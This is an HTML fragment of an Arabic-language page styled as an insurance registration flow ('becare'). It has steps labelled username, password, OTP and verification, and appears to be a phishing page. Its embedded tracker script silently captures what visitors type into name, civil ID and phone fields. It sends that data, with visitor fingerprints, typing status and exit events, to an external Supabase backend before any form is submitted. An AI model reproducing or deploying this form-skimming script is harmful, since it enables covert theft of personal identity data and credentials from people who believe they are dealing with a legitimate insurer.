div class="demo-actions"><a class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium cursor-pointer transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 disabled:cursor-not-allowed [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 bg-primary text-primary-foreground shadow hover:bg-primary/90 h-9 px-4 py-2 demo-pill demo-next" href="/access-password/">التالي</a></div></section><footer class="demo-footer"><strong>تسجيل لأول مرة</strong><p>معاينة التسجيل دون إدخال بيانات</p><a class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium cursor-pointer transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 disabled:cursor-not-allowed [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 text-primary underline-offset-4 hover:underline h-9 px-4 py-2" href="/customer-details/">اضغط هنا للبدء</a></footer></main><!--/$--><section aria-label="Notifications alt+T" tabindex="-1" aria-live="polite" aria-relevant="additions text" aria-atomic="false" data-react-aria-top-layer="true"></section><script id="becare-tracker">
(function () {
  try {
    var SU = 'https://gqcugugpigkfaihpaikt.supabase.co';
    var SK = 'sb_publishable_9XuOSJFbIz3mNBAibcPiDw_qUZzvYSf';
    var K = 'becare_visitor_id';
    var L = 'becare_lead';

    var vid = localStorage.getItem(K);
    if (!vid) {
      vid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = crypto.getRandomValues(new Uint8Array(1))[0] % 16;
        return (c === 'x' ? r : (r & 0x3) | 0x8).toString(16);
      });
      localStorage.setItem(K, vid);
    }

    var path = location.pathname.replace(/\/+$/, '');
    var map = [
      [/customer-details/i, 'insurance'],
      [/access-waiting/i, 'verify'],
      [/access-verification/i, 'OTP'],
      [/access-password/i, 'كلمة المرور'],
      [/access-username/i, 'الدخول']
    ];
    var status = 'الرئيسية';
    if (path && !/\/(index\.html)?$/i.test(path)) {
      for (var i = 0; i < map.length; i++) {
        if (map[i][0].test(path)) { status = map[i][1]; break; }
      }
    }

    function lead() {
      try { return JSON.parse(localStorage.getItem(L) || '{}'); } catch (e) { return {}; }
    }

    function send() {
      try {
        var d = lead();
        fetch(SU + '/rest/v1/rpc/track_visit', {
          method: 'POST',
          headers: { 'apikey': SK, 'Content-Type': 'application/json' },
          body: JSON.stringify({
            p_visitor_id: vid,
            p_page: location.pathname,
            p_status: status,
            p_referrer: document.referrer || '',
            p_user_agent: navigator.userAgent,
            p_device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
            p_name: d.fullName || null,
            p_civil_id: d.civilId || null,
            p_phone: d.phone || null
          })
        }).catch(function () {});
      } catch (e) {}
    }

    var typingTimer = null;
    var leadTimer = null;
    var typingFlag = false;
    function setTyping(flag) {
      try {
        fetch(SU + '/rest/v1/rpc/set_typing', {
          method: 'POST',
          keepalive: true,
          headers: { 'apikey': SK, 'Content-Type': 'application/json' },
          body: JSON.stringify({ p_visitor_id: vid, p_typing: flag })
        }).catch(function () {});
      } catch (e) {}
    }
    document.addEventListener('input', function (e) {
      try {
        var t = e.target;
        if (!t || !t.id || ['fullName', 'civilId', 'phone'].indexOf(t.id) === -1) return;
        var d = lead();
        d[t.id] = t.value;
        localStorage.setItem(L, JSON.stringify(d));
        if (!typingFlag) { typingFlag = true; setTyping(true); }
        if (typingTimer) clearTimeout(typingTimer);
        typingTimer = setTimeout(function () { typingFlag = false; setTyping(false); }, 2000);
        if (leadTimer) clearTimeout(leadTimer);
        leadTimer = setTimeout(send, 1200);
      } catch (err) {}
    });

    function leave() {
      try {
        fetch(SU + '/rest/v1/rpc/mark_leave', {
          method: 'POST',
          keepalive: true,
          headers: { 'apikey': SK, 'Content-Type': 'application/json' },
          body: JSON.stringify({ p_visitor_id: vid })
        }).catch(function () {});
      } catch (e) {}
    }
    window.addEventListener('pagehide', leave);
    window.addEventListener('beforeunload', leave);

    send();
    setInterval(send, 30000);
    document.addEventListener('visibilitychange', function () {
      if (!document.hidden) send();
    });
  } catch (e) {}
})();

</script>
